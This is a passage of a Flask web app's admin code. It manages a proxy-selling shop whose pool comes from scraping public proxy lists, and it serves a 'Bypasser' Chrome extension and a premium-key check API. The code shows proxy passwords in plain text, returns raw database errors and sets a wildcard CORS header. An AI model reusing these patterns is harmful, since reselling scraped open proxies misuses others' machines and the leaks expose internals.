                <form method="POST" action="/admin/proxyshop/sync-node" style="display:inline;"><input type="hidden" name="node_id" value="{n['id']}"><button type="submit" class="btn btn-sm" style="padding:3px 8px;font-size:0.75em;background:#6366f1;">Sync</button></form>
                <form method="POST" action="/admin/proxyshop/delete-node" style="display:inline;" onsubmit="return confirm('Delete node?')"><input type="hidden" name="node_id" value="{n['id']}"><button type="submit" class="btn btn-sm" style="padding:3px 8px;font-size:0.75em;background:#ef4444;">Del</button></form>
            </td>
        </tr>"""

    servers_html = ""
    for s in servers:
        active_cls = 'color:#4ade80;' if s.get('active') else 'color:#ef4444;'
        active_txt = 'Active' if s.get('active') else 'Disabled'
        max_bw = float(s.get('max_bandwidth_gb', 0) or 0)
        used_bw = float(s.get('used_bandwidth_gb', 0) or 0)
        bw_display = f"{used_bw:.0f}/{max_bw:.0f} GB" if max_bw > 0 else f"{used_bw:.0f} GB"
        servers_html += f"""<tr>
            <td>{s['id']}</td><td>{_h(s['host'])}</td><td>{s['port']}</td>
            <td>{_h(s['proxy_type'])}</td><td>{_h(s.get('country','') or '-')}</td>
            <td>{bw_display}</td><td>{_h(s.get('label','') or '-')}</td>
            <td style="{active_cls}font-weight:700;">{active_txt}</td>
            <td style="white-space:nowrap;">
                <form method="POST" action="/admin/proxyshop/toggle-server" style="display:inline;"><input type="hidden" name="server_id" value="{s['id']}"><input type="hidden" name="active" value="{'false' if s.get('active') else 'true'}"><button type="submit" class="btn btn-sm" style="padding:3px 8px;font-size:0.75em;">{'Disable' if s.get('active') else 'Enable'}</button></form>
                <button class="btn btn-sm" style="padding:3px 8px;font-size:0.75em;background:#6366f1;" onclick="document.getElementById('edit-srv-{s['id']}').style.display=document.getElementById('edit-srv-{s['id']}').style.display==='none'?'table-row':'none'">Edit</button>
                <form method="POST" action="/admin/proxyshop/delete-server" style="display:inline;" onsubmit="return confirm('Delete?')"><input type="hidden" name="server_id" value="{s['id']}"><button type="submit" class="btn btn-sm" style="padding:3px 8px;font-size:0.75em;background:#ef4444;">Del</button></form>
            </td>
        </tr>
        <tr id="edit-srv-{s['id']}" style="display:none;background:rgba(99,102,241,0.1);">
            <td colspan="9">
                <form method="POST" action="/admin/proxyshop/edit-server" style="display:flex;gap:8px;flex-wrap:wrap;align-items:end;padding:8px;">
                    <input type="hidden" name="server_id" value="{s['id']}">
                    <div><label style="display:block;font-size:0.7em;opacity:0.6;">Host</label><input type="text" name="host" value="{_h(s['host'])}" style="{_fi}width:120px;"></div>
                    <div><label style="display:block;font-size:0.7em;opacity:0.6;">Port</label><input type="number" name="port" value="{s['port']}" style="{_fi}width:60px;"></div>
                    <div><label style="display:block;font-size:0.7em;opacity:0.6;">Type</label><select name="proxy_type" style="{_fi}">{''.join(f'<option value="{t}"{"selected" if t == s.get("proxy_type","") else ""}>{t}</option>' for t in PROXY_TYPES)}</select></div>
                    <div><label style="display:block;font-size:0.7em;opacity:0.6;">Username</label><input type="text" name="username" value="{_h(s.get('username','') or '')}" style="{_fi}width:80px;"></div>
                    <div><label style="display:block;font-size:0.7em;opacity:0.6;">Password</label><input type="text" name="password" value="{_h(s.get('password','') or '')}" style="{_fi}width:80px;"></div>
                    <div><label style="display:block;font-size:0.7em;opacity:0.6;">Country</label><input type="text" name="country" value="{_h(s.get('country','') or '')}" style="{_fi}width:60px;"></div>
                    <div><label style="display:block;font-size:0.7em;opacity:0.6;">Max BW (GB)</label><input type="number" name="max_bandwidth_gb" step="0.1" value="{max_bw}" style="{_fi}width:70px;"></div>
                    <div><label style="display:block;font-size:0.7em;opacity:0.6;">Label</label><input type="text" name="label" value="{_h(s.get('label','') or '')}" style="{_fi}width:80px;"></div>
                    <button type="submit" class="btn btn-sm" style="padding:5px 12px;font-size:0.75em;background:#22c55e;">Save</button>
                </form>
            </td>
        </tr>"""

    purchases_html = ""
    for pu in purchases['purchases']:
        st = pu.get('status', 'active')
        st_color = '#4ade80' if st == 'active' else '#ef4444'
        pu_bm = bandwidth_meter_data(pu)
        cancel_btn = ''
        if st == 'active':
            cancel_btn = f'''<form method="POST" action="/admin/proxyshop/cancel-purchase" style="display:inline;" onsubmit="return confirm('Cancel?')"><input type="hidden" name="purchase_id" value="{pu['id']}"><button type="submit" class="btn btn-sm" style="padding:3px 8px;font-size:0.7em;background:#ef4444;">Cancel</button></form>'''
        purchases_html += f"""<tr>
            <td>{pu['id']}</td><td>{pu['user_id']}</td><td>{_h(pu.get('plan_name','') or '-')}</td>
            <td>{_h(pu.get('proxy_type',''))}</td>
            <td>{_h(pu.get('proxy_host',''))}:{pu.get('proxy_port',0)}</td>
            <td>${float(pu.get('price',0)):.2f}</td>
            <td style="font-size:0.8em;color:{pu_bm['color']};">{_h(pu_bm['label'])}</td>
            <td style="color:{st_color};font-weight:700;">{st.upper()}</td>
            <td>{str(pu.get('purchased_at',''))[:10]}</td>
            <td>{cancel_btn}</td>
        </tr>"""

    pool_alive = pool.get('alive', 0)
    pool_total = pool.get('total', 0)
    pool_pct = f"{(pool_alive/pool_total*100):.0f}" if pool_total > 0 else '0'
    pool_by_type = pool.get('by_type', {})
    pool_type_str = ', '.join(f"{k}: {v}" for k, v in pool_by_type.items()) if pool_by_type else 'None'
    pool_by_class = pool.get('by_classification', {})
    pool_class_str = ', '.join(f"{k}: {v}" for k, v in pool_by_class.items()) if pool_by_class else 'None'
    scraper_info = pool.get('scraper', {})
    scraper_last = scraper_info.get('last_run', 'Never')

    scrape_srcs = get_scrape_sources()
    sources_html = ""
    for ss in scrape_srcs:
        en = ss.get('enabled', True)
        en_cls = 'color:#4ade80;' if en else 'color:#ef4444;'
        en_txt = 'Enabled' if en else 'Disabled'
        last_run = str(ss.get('last_run', '') or 'Never')[:16]
        sources_html += f"""<tr>
            <td>{ss['id']}</td><td>{_h(ss['name'])}</td><td>{_h(ss.get('proxy_type',''))}</td>
            <td>{'Yes' if ss.get('json_mode') else 'No'}</td>
            <td>{ss.get('interval_minutes',20)}m</td>
            <td>{last_run}</td><td>{ss.get('last_count',0)}</td><td>{ss.get('last_alive',0)}</td>
            <td style="{en_cls}font-weight:700;">{en_txt}</td>
            <td style="white-space:nowrap;">
                <form method="POST" action="/admin/proxyshop/toggle-source" style="display:inline;"><input type="hidden" name="source_id" value="{ss['id']}"><input type="hidden" name="enabled" value="{'false' if en else 'true'}"><button type="submit" class="btn btn-sm" style="padding:3px 8px;font-size:0.75em;">{'Disable' if en else 'Enable'}</button></form>
                <form method="POST" action="/admin/proxyshop/delete-source" style="display:inline;" onsubmit="return confirm('Delete?')"><input type="hidden" name="source_id" value="{ss['id']}"><button type="submit" class="btn btn-sm" style="padding:3px 8px;font-size:0.75em;background:#ef4444;">Del</button></form>
            </td>
        </tr>"""

    return render_template_string(f"""
    <html>
    <head><title>Proxy Shop - Admin</title>{ADMIN_CSS}
    <style>
        .admin-table {{ width: 100%; border-collapse: collapse; margin-top: 15px; }}
        .admin-table th, .admin-table td {{ padding: 8px 12px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.08); font-size: 0.85em; }}
        .admin-table th {{ opacity: 0.6; font-weight: 600; }}
    </style>
    </head>
    <body>
        {_admin_proxy_sidebar()}
        <div class="main">
            <div class="header"><h1>Proxy Provider Management</h1></div>
            <div class="stats-grid">
                <div class="stat-card"><h3>{stats['active_plans']}</h3><p>Active Plans</p></div>
                <div class="stat-card"><h3>{stats.get('online_nodes',0)}/{stats.get('active_nodes',0)}</h3><p>VPS Nodes (Online)</p></div>
                <div class="stat-card"><h3>{pool_alive}</h3><p>Pool Proxies ({pool_pct}% alive)</p></div>
                <div class="stat-card"><h3>{stats['active_purchases']}</h3><p>Active Subs</p></div>
                <div class="stat-card"><h3>${stats['total_revenue']:.2f}</h3><p>Total Revenue</p></div>
                <div class="stat-card"><h3>{stats['active_servers']}</h3><p>Legacy Servers</p></div>
            </div>

            <div class="card">
                <h2>VPS Nodes</h2>
                <p style="font-size:0.8em;opacity:0.5;margin-bottom:10px;">Add your VPS servers here. Deploy the daemon script on each VPS to enable proxy connections.</p>
                <form method="POST" action="/admin/proxyshop/add-node" style="display:flex;gap:10px;flex-wrap:wrap;align-items:end;">
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Host/IP</label><input type="text" name="host" required placeholder="1.2.3.4" style="{_fi2}"></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">API Port</label><input type="number" name="api_port" value="8899" style="{_fi2}width:80px;"></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Country</label><input type="text" name="country" placeholder="US" style="{_fi2}width:60px;"></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Max BW (GB)</label><input type="number" name="max_bandwidth_gb" step="0.1" value="0" style="{_fi2}width:80px;"></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Protocols</label><input type="text" name="protocols" value="HTTP,SOCKS5" style="{_fi2}width:120px;"></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Label</label><input type="text" name="label" placeholder="US-Node-1" style="{_fi2}width:100px;"></div>
                    <button type="submit" class="btn btn-primary">Add Node</button>
                </form>
                <table class="admin-table">
                    <thead><tr><th>ID</th><th>Label</th><th>Host</th><th>API Port</th><th>Country</th><th>Protocols</th><th>Bandwidth</th><th>Users</th><th>Status</th><th>Last Seen</th><th>Actions</th></tr></thead>
                    <tbody>{nodes_html if nodes_html else '<tr><td colspan="11" style="text-align:center;opacity:0.5;">No VPS nodes yet — add one above</td></tr>'}</tbody>
                </table>
            </div>

            <div class="card">
                <h2>Proxy Pool (Auto-Sourced)</h2>
                <div style="display:flex;gap:20px;flex-wrap:wrap;font-size:0.9em;margin-bottom:10px;">
                    <div><strong style="color:#4ade80;">{pool_alive}</strong> alive / {pool_total} total</div>
                    <div>Types: {pool_type_str}</div>
                    <div>Classification: {pool_class_str}</div>
                    <div>Last scrape: {scraper_last}</div>
                </div>
                <form method="POST" action="/admin/proxyshop/scrape-now" style="display:inline;">
                    <button type="submit" class="btn btn-sm" style="background:#22d3ee;">Scrape Now</button>
                </form>
                <a href="/admin/proxyshop/scrape-history" class="btn btn-sm" style="background:#6366f1;text-decoration:none;margin-left:8px;">Scrape History</a>
            </div>

            <div class="card">
                <h2>Scrape Sources</h2>
                <p style="font-size:0.8em;opacity:0.5;margin-bottom:10px;">Manage proxy scraping sources. Enable/disable or add new ones.</p>
                <form method="POST" action="/admin/proxyshop/add-source" style="display:flex;gap:10px;flex-wrap:wrap;align-items:end;margin-bottom:15px;">
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Name</label><input type="text" name="name" required placeholder="my_source" style="{_fi2}"></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">URL</label><input type="text" name="url" required placeholder="https://..." style="{_fi2}width:250px;"></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Type</label><select name="proxy_type" style="{_fi2}">{type_options}</select></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">JSON?</label><select name="json_mode" style="{_fi2}"><option value="false">No</option><option value="true">Yes</option></select></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Interval (min)</label><input type="number" name="interval_minutes" value="20" style="{_fi2}width:60px;"></div>
                    <button type="submit" class="btn btn-primary">Add Source</button>
                </form>
                <table class="admin-table">
                    <thead><tr><th>ID</th><th>Name</th><th>Type</th><th>JSON</th><th>Interval</th><th>Last Run</th><th>Last Count</th><th>Alive</th><th>Status</th><th>Actions</th></tr></thead>
                    <tbody>{sources_html if sources_html else '<tr><td colspan="10" style="text-align:center;opacity:0.5;">No sources — defaults will be seeded on first scrape</td></tr>'}</tbody>
                </table>
            </div>

            <div class="card">
                <h2>Proxy Plans</h2>
                <form method="POST" action="/admin/proxyshop/add-plan" style="display:flex;gap:10px;flex-wrap:wrap;align-items:end;">
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Name</label><input type="text" name="name" required placeholder="e.g. SOCKS5 Basic" style="{_fi2}"></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Type</label><select name="proxy_type" style="{_fi2}">{type_options}</select></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Bandwidth (GB)</label><input type="number" name="bandwidth_gb" step="0.1" required style="{_fi2}width:80px;"></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Price ($)</label><input type="number" name="price" step="0.01" required style="{_fi2}width:80px;"></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Duration</label><input type="number" name="duration_days" value="30" style="{_fi2}width:60px;"></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Country</label><input type="text" name="country" placeholder="Optional" style="{_fi2}width:80px;"></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Category</label><select name="category" style="{_fi2}">{cat_options}</select></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Source</label><select name="source_type" style="{_fi2}">{src_options}</select></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Description</label><input type="text" name="description" placeholder="Optional" style="{_fi2}"></div>
                    <button type="submit" class="btn btn-primary">Add Plan</button>
                </form>
                <table class="admin-table">
                    <thead><tr><th>ID</th><th>Name</th><th>Type</th><th>BW</th><th>Price</th><th>Duration</th><th>Country</th><th>Category</th><th>Source</th><th>Status</th><th>Actions</th></tr></thead>
                    <tbody>{plans_html if plans_html else '<tr><td colspan="11" style="text-align:center;opacity:0.5;">No plans yet</td></tr>'}</tbody>
                </table>
            </div>

            <div class="card">
                <h2>Legacy Proxy Servers</h2>
                <p style="font-size:0.8em;opacity:0.5;margin-bottom:10px;">These are manually added proxy servers (old system). New plans should use VPS Nodes above.</p>
                <form method="POST" action="/admin/proxyshop/add-server" style="display:flex;gap:10px;flex-wrap:wrap;align-items:end;">
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Host</label><input type="text" name="host" required style="{_fi2}"></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Port</label><input type="number" name="port" required style="{_fi2}width:80px;"></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Type</label><select name="proxy_type" style="{_fi2}">{type_options}</select></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Username</label><input type="text" name="username" style="{_fi2}"></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Password</label><input type="text" name="password" style="{_fi2}"></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Country</label><input type="text" name="country" style="{_fi2}width:60px;"></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Max BW</label><input type="number" name="max_bandwidth_gb" step="0.1" value="0" style="{_fi2}width:80px;"></div>
                    <div><label style="display:block;font-size:0.8em;opacity:0.6;">Label</label><input type="text" name="label" style="{_fi2}"></div>
                    <button type="submit" class="btn btn-primary">Add Server</button>
                </form>
                <table class="admin-table">
                    <thead><tr><th>ID</th><th>Host</th><th>Port</th><th>Type</th><th>Country</th><th>BW</th><th>Label</th><th>Status</th><th>Actions</th></tr></thead>
                    <tbody>{servers_html if servers_html else '<tr><td colspan="9" style="text-align:center;opacity:0.5;">No servers</td></tr>'}</tbody>
                </table>
            </div>

            <div class="card">
                <h2>Purchases / Subscriptions</h2>
                <table class="admin-table">
                    <thead><tr><th>ID</th><th>User</th><th>Plan</th><th>Type</th><th>Proxy</th><th>Price</th><th>Bandwidth</th><th>Status</th><th>Date</th><th>Action</th></tr></thead>
                    <tbody>{purchases_html if purchases_html else '<tr><td colspan="10" style="text-align:center;opacity:0.5;">No purchases</td></tr>'}</tbody>
                </table>
            </div>
        </div>
    </body>
    </html>
    """)


@app.route('/admin/proxyshop/add-plan', methods=['POST'])
@admin_required
def admin_proxyshop_add_plan():
    name = request.form.get('name', '').strip()
    proxy_type = request.form.get('proxy_type', 'SOCKS5')
    bandwidth_gb = request.form.get('bandwidth_gb', 0, type=float)
    price = request.form.get('price', 0, type=float)
    duration_days = request.form.get('duration_days', 30, type=int) or 30
    country = request.form.get('country', '').strip()
    description = request.form.get('description', '').strip()
    category = request.form.get('category', 'datacenter').strip()
    source_type = request.form.get('source_type', 'vps').strip()
    if name and bandwidth_gb >= 0 and price > 0:
        create_plan(name, proxy_type, bandwidth_gb, price, duration_days, country, description, category, source_type)
    return redirect('/admin/proxyshop')


@app.route('/admin/proxyshop/edit-plan', methods=['POST'])
@admin_required
def admin_proxyshop_edit_plan():
    plan_id = request.form.get('plan_id', 0, type=int)
    if plan_id:
        update_proxy_plan(
            plan_id,
            name=request.form.get('name', '').strip() or None,
            bandwidth_gb=request.form.get('bandwidth_gb', type=float),
            price=request.form.get('price', type=float),
            duration_days=request.form.get('duration_days', type=int),
            country=request.form.get('country', ''),
            description=request.form.get('description', ''),
            category=request.form.get('category', None),
            source_type=request.form.get('source_type', None)
        )
    return redirect('/admin/proxyshop')


@app.route('/admin/proxyshop/toggle-plan', methods=['POST'])
@admin_required
def admin_proxyshop_toggle_plan():
    plan_id = request.form.get('plan_id', 0, type=int)
    active = request.form.get('active', 'true') == 'true'
    if plan_id:
        update_proxy_plan(plan_id, active=active)
    return redirect('/admin/proxyshop')


@app.route('/admin/proxyshop/delete-plan', methods=['POST'])
@admin_required
def admin_proxyshop_delete_plan():
    plan_id = request.form.get('plan_id', 0, type=int)
    if plan_id:
        delete_proxy_plan(plan_id)
    return redirect('/admin/proxyshop')


@app.route('/admin/proxyshop/add-server', methods=['POST'])
@admin_required
def admin_proxyshop_add_server():
    host = request.form.get('host', '').strip()
    port = request.form.get('port', 0, type=int)
    proxy_type = request.form.get('proxy_type', 'SOCKS5')
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    country = request.form.get('country', '').strip()
    max_bandwidth_gb = request.form.get('max_bandwidth_gb', 0, type=float)
    label = request.form.get('label', '').strip()
    if host and port > 0:
        add_proxy_server(host, port, proxy_type, username, password, country, max_bandwidth_gb, label)
    return redirect('/admin/proxyshop')


@app.route('/admin/proxyshop/edit-server', methods=['POST'])
@admin_required
def admin_proxyshop_edit_server():
    server_id = request.form.get('server_id', 0, type=int)
    if server_id:
        kwargs = {}
        host = request.form.get('host', '').strip()
        if host:
            kwargs['host'] = host
        port = request.form.get('port', type=int)
        if port:
            kwargs['port'] = port
        proxy_type = request.form.get('proxy_type', '').strip()
        if proxy_type:
            kwargs['proxy_type'] = proxy_type
        username = request.form.get('username')
        if username is not None:
            kwargs['username'] = username
        password = request.form.get('password')
        if password is not None:
            kwargs['password'] = password
        country = request.form.get('country')
        if country is not None:
            kwargs['country'] = country
        max_bw = request.form.get('max_bandwidth_gb', type=float)
        if max_bw is not None:
            kwargs['max_bandwidth_gb'] = max_bw
        label = request.form.get('label')
        if label is not None:
            kwargs['label'] = label
        if kwargs:
            update_proxy_server(server_id, **kwargs)
    return redirect('/admin/proxyshop')


@app.route('/admin/proxyshop/cancel-purchase', methods=['POST'])
@admin_required
def admin_proxyshop_cancel_purchase():
    purchase_id = request.form.get('purchase_id', 0, type=int)
    if purchase_id:
        cancel_proxy_purchase(purchase_id)
    return redirect('/admin/proxyshop')


@app.route('/admin/proxyshop/toggle-server', methods=['POST'])
@admin_required
def admin_proxyshop_toggle_server():
    server_id = request.form.get('server_id', 0, type=int)
    active = request.form.get('active', 'true') == 'true'
    if server_id:
        update_proxy_server(server_id, active=active)
    return redirect('/admin/proxyshop')


@app.route('/admin/proxyshop/delete-server', methods=['POST'])
@admin_required
def admin_proxyshop_delete_server():
    server_id = request.form.get('server_id', 0, type=int)
    if server_id:
        delete_proxy_server(server_id)
    return redirect('/admin/proxyshop')


@app.route('/admin/proxyshop/add-node', methods=['POST'])
@admin_required
def admin_proxyshop_add_node():
    host = request.form.get('host', '').strip()
    api_port = request.form.get('api_port', 8899, type=int)
    country = request.form.get('country', '').strip()
    max_bw = request.form.get('max_bandwidth_gb', 0, type=float)
    protocols = request.form.get('protocols', 'HTTP,SOCKS5').strip()
    label = request.form.get('label', '').strip()
    if host:
        add_node(host, api_port=api_port, country=country, label=label,
                 max_bandwidth_gb=max_bw, protocols=protocols)
    return redirect('/admin/proxyshop')


@app.route('/admin/proxyshop/delete-node', methods=['POST'])
@admin_required
def admin_proxyshop_delete_node():
    node_id = request.form.get('node_id', 0, type=int)
    if node_id:
        delete_node(node_id)
    return redirect('/admin/proxyshop')


@app.route('/admin/proxyshop/sync-node', methods=['POST'])
@admin_required
def admin_proxyshop_sync_node():
    node_id = request.form.get('node_id', 0, type=int)
    if node_id:
        node = get_node(node_id)
        if node:
            sync_node_credentials(node)
    return redirect('/admin/proxyshop')


@app.route('/admin/proxyshop/node-script/<int:node_id>')
@admin_required
def admin_proxyshop_node_script(node_id):
    node = get_node(node_id)
    if not node:
        return redirect('/admin/proxyshop')
    script = generate_deploy_script(node)
    return render_template_string(f"""
    <html>
    <head><title>Deploy Script - Node #{node_id}</title>{ADMIN_CSS}</head>
    <body>
        {_admin_proxy_sidebar()}
        <div class="main">
            <div class="header"><h1>Deploy Script — {_h(node.get('label','') or node['host'])}</h1></div>
            <div class="card">
                <p style="margin-bottom:15px;opacity:0.7;">Copy this script to your VPS and run it with <code>python3 proxy_daemon.py</code></p>
                <div style="position:relative;">
                    <pre id="daemon-script" style="background:rgba(0,0,0,0.5);padding:20px;border-radius:10px;overflow-x:auto;font-size:0.8em;max-height:500px;overflow-y:auto;white-space:pre-wrap;word-wrap:break-word;">{_h(script)}</pre>
                    <button onclick="navigator.clipboard.writeText(document.getElementById('daemon-script').textContent);this.textContent='Copied!';setTimeout(()=>this.textContent='Copy Script',2000);" style="position:absolute;top:10px;right:10px;padding:8px 18px;background:#ff1493;border:none;border-radius:8px;color:#fff;cursor:pointer;font-weight:600;">Copy Script</button>
                </div>
                <div style="margin-top:20px;">
                    <a href="/admin/proxyshop" style="text-decoration:none;padding:10px 20px;background:#6366f1;border-radius:8px;color:#fff;">Back to Proxy Shop</a>
                </div>
            </div>
        </div>
    </body>
    </html>
    """)


@app.route('/admin/proxyshop/scrape-now', methods=['POST'])
@admin_required
def admin_proxyshop_scrape_now():
    import threading
    from modules.proxy_scraper_engine import run_scrape_cycle
    import asyncio
    def _run():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(run_scrape_cycle())
        loop.close()
    t = threading.Thread(target=_run, daemon=True)
    t.start()
    return redirect('/admin/proxyshop')


@app.route('/admin/proxyshop/add-source', methods=['POST'])
@admin_required
def admin_proxyshop_add_source():
    name = request.form.get('name', '').strip()
    url = request.form.get('url', '').strip()
    proxy_type = request.form.get('proxy_type', 'HTTP')
    json_mode = request.form.get('json_mode', 'false') == 'true'
    interval = request.form.get('interval_minutes', 20, type=int)
    if name and url:
        add_scrape_source(name, url, proxy_type, True, json_mode, interval)
    return redirect('/admin/proxyshop')


@app.route('/admin/proxyshop/toggle-source', methods=['POST'])
@admin_required
def admin_proxyshop_toggle_source():
    source_id = request.form.get('source_id', 0, type=int)
    enabled = request.form.get('enabled', 'true') == 'true'
    if source_id:
        toggle_scrape_source(source_id, enabled)
    return redirect('/admin/proxyshop')


@app.route('/admin/proxyshop/delete-source', methods=['POST'])
@admin_required
def admin_proxyshop_delete_source():
    source_id = request.form.get('source_id', 0, type=int)
    if source_id:
        delete_scrape_source(source_id)
    return redirect('/admin/proxyshop')


@app.route('/admin/proxyshop/scrape-history')
@admin_required
def admin_proxyshop_scrape_history():
    history = get_scrape_history(limit=100)
    rows = ""
    for h in history:
        err = _h(h.get('error', '') or '')[:60]
        err_cls = 'color:#ef4444;' if err else ''
        rows += f"""<tr>
            <td>{str(h.get('created_at',''))[:16]}</td>
            <td>{_h(h.get('source_name',''))}</td>
            <td>{h.get('total_scraped',0)}</td>
            <td>{h.get('total_alive',0)}</td>
            <td>{h.get('total_stored',0)}</td>
            <td>{float(h.get('duration_seconds',0)):.1f}s</td>
            <td style="{err_cls}">{err if err else '-'}</td>
        </tr>"""

    return render_template_string(f"""
    <html>
    <head><title>Scrape History - Admin</title>{ADMIN_CSS}
    <style>
        .admin-table {{ width: 100%; border-collapse: collapse; margin-top: 15px; }}
        .admin-table th, .admin-table td {{ padding: 8px 12px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.08); font-size: 0.85em; }}
        .admin-table th {{ opacity: 0.6; font-weight: 600; }}
    </style>
    </head>
    <body>
        {_admin_proxy_sidebar()}
        <div class="main">
            <div class="header"><h1>Scrape History</h1></div>
            <div class="card">
                <a href="/admin/proxyshop" style="text-decoration:none;padding:8px 18px;background:#6366f1;border-radius:8px;color:#fff;font-size:0.85em;">Back to Proxy Shop</a>
                <table class="admin-table">
                    <thead><tr><th>Time</th><th>Source</th><th>Scraped</th><th>Alive</th><th>Stored</th><th>Duration</th><th>Error</th></tr></thead>
                    <tbody>{rows if rows else '<tr><td colspan="7" style="text-align:center;opacity:0.5;">No history yet</td></tr>'}</tbody>
                </table>
            </div>
        </div>
    </body>
    </html>
    """)


# ─── Wallet Frontend Static Serving ──────────────────────────────────────────
import os as _os
_SRC_DIR = _os.path.dirname(_os.path.abspath(__file__))
_PROJECT_ROOT = _os.path.dirname(_SRC_DIR)
_WALLET_DIST_CANDIDATES = [
    _os.path.join(_PROJECT_ROOT, "artifacts", "onichan-bot", "dist", "public"),
    _os.path.join(_PROJECT_ROOT, "artifacts", "onichan-bot", "dist"),
    _os.path.join(_PROJECT_ROOT, "artifacts", "onichan-bot", "public"),
]
_WALLET_DIST = None
for _candidate in _WALLET_DIST_CANDIDATES:
    if _os.path.isdir(_candidate) and _os.path.isfile(_os.path.join(_candidate, 'index.html')):
        _WALLET_DIST = _candidate
        break

@app.route('/wallet')
def serve_wallet_root():
    if not _WALLET_DIST:
        return """<html><head><title>Wallet</title><style>
        body{background:#1a0a2e;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
        .box{text-align:center;padding:40px;background:rgba(255,255,255,0.05);border-radius:16px;border:1px solid rgba(255,20,147,0.3)}
        h2{color:#ff1493}a{color:#ff69b4}
        </style></head><body><div class="box"><h2>Crypto Wallet</h2>
        <p>Wallet frontend is not built yet.</p>
        <p>Use the bot commands to manage your wallet.</p>
        <a href="/user">← Back to Dashboard</a></div></body></html>"""
    return send_from_directory(_WALLET_DIST, 'index.html')

@app.route('/wallet/', defaults={'subpath': ''})
@app.route('/wallet/<path:subpath>')
def serve_wallet(subpath):
    if not _WALLET_DIST:
        return redirect('/wallet')
    if subpath and _os.path.isfile(_os.path.join(_WALLET_DIST, subpath)):
        return send_from_directory(_WALLET_DIST, subpath)
    return send_from_directory(_WALLET_DIST, 'index.html')


from modules.casino_routes import register_casino_routes
register_casino_routes(app, user_required, owner_required, get_user_sidebar, USER_CSS, ADMIN_CSS)


# ===== Onichan Bypasser V1 — Direct Download =====
@app.route('/download/onichan-bypasser.zip', methods=['GET'])
@app.route('/bypasser', methods=['GET'])
@app.route('/bypasser.zip', methods=['GET'])
def download_bypasser():
    """Direct download of the Onichan Bypasser V1 Chrome extension zip."""
    from flask import send_file, abort
    import os as _os
    zip_path = '/home/runner/workspace/Onichan-Bypasser-V1.zip'
    if not _os.path.exists(zip_path):
        return abort(404, 'Bypasser build not found')
    return send_file(
        zip_path,
        mimetype='application/zip',
        as_attachment=True,
        download_name='Onichan-Bypasser-V1.zip',
        max_age=0
    )


# ===== Onichan Animated Emoji Pack — Direct Download =====
@app.route('/download/animated-emojis.json', methods=['GET'])
@app.route('/emojis', methods=['GET'])
@app.route('/emojis.json', methods=['GET'])
def download_animated_emojis():
    """Direct download of the Onichan animated emoji ID pack (JSON)."""
    from flask import send_file, abort
    import os as _os
    json_path = _os.path.join(_os.path.dirname(_os.path.abspath(__file__)), 'animated_emojis.json')
    if not _os.path.exists(json_path):
        return abort(404, 'Emoji pack not found')
    return send_file(
        json_path,
        mimetype='application/json',
        as_attachment=True,
        download_name='animated_emojis.json',
        max_age=0
    )


# ===== Onichan Bypasser V1 — Premium Key API =====
@app.route('/api/bypasser/validate', methods=['POST', 'OPTIONS'])
def api_bypasser_validate():
    """Validate a premium key for the Onichan Bypasser Chrome extension.

    Same key the user redeems in the bot also unlocks the extension.
    Accepts an unused key (treats as freshly-issued) OR a key that was
    redeemed by a user who still has active premium.
    """
    from flask import request, jsonify, make_response
    from datetime import datetime, timedelta

    def _cors(resp):
        resp.headers['Access-Control-Allow-Origin'] = '*'
        resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        return resp

    if request.method == 'OPTIONS':
        return _cors(make_response('', 204))

    try:
        data = request.get_json(force=True, silent=True) or {}
    except Exception:
        data = {}
    key = (data.get('key') or '').strip().upper()

    if not key:
        return _cors(jsonify({'valid': False, 'error': 'Missing key'}))

    try:
        from modules.database import _execute_with_retry
        row = _execute_with_retry(
            "SELECT key, days, used, used_by, used_at, created_at "
            "FROM premium_keys WHERE key = %s",
            (key,), fetch_one=True
        )
    except Exception as e:
        return _cors(jsonify({'valid': False, 'error': f'DB error: {e}'}))

    if not row:
        return _cors(jsonify({'valid': False, 'error': 'Key not found'}))

    days = int(row.get('days') or 0)
    now = datetime.utcnow()

    # If key has not been used yet, it's valid for `days` from now
    if not row.get('used'):
        expires = now + timedelta(days=days)
        return _cors(jsonify({
            'valid': True,
            'key': key,
            'days': days,
            'expires_at': expires.isoformat() + 'Z',
            'tier': 'PREMIUM',
            'message': f'Key valid — {days} days of access'
        }))

    # Key was redeemed — check if redeemer still has active premium
    used_by = row.get('used_by')
    used_at = row.get('used_at')
    if used_by:
        try:
            user = _execute_with_retry(
                "SELECT premium, premium_expiry, username FROM users WHERE user_id = %s",
                (int(used_by),), fetch_one=True
            )
        except Exception:
            user = None
